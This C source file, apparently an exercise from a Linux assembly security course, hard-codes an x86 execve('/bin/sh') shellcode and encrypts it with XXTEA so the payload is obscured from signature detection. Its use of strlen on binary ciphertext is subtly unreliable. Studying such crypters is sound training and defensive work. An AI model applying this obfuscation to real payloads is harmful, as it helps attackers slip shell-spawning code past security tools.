/** Encrypts shellcode using XXTEA algorithm.
 * \brief 
 * \details This was created as part of the SecurityTube Linux Assembly Expert
 * course at http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
 * \author Travis Mathison
 * \copyright
 *
 * The MIT License (MIT)
 * 
 * Copyright (c) 2018 Travis Mathison
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
#include <stdio.h>
#include <string.h>
#include "xxtea.h"

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("%s\n", "usage: ./encrypt <key>");
        exit(1);
    }

    unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
    size_t shellcode_len = strlen((const char *) shellcode);
    const char *key = argv[1];

    printf("%s\n", "Shellcode before encryption:");
    for (int counter = 0; counter < shellcode_len; ++counter) {
        printf("\\x%02x", shellcode[counter]);
    }

    size_t len;
    unsigned char *encrypt_data = xxtea_encrypt(shellcode, strlen(shellcode), key, &len);

    printf("\n\nEncrypted shellcode:\n");
    for (size_t counter = 0; counter < strlen(encrypt_data); counter += 2) {
        printf("\\x%02x\\x%02x", (int)encrypt_data[counter], (int)encrypt_data[counter+1]);
    }

    printf("\n");

    return 0;
}
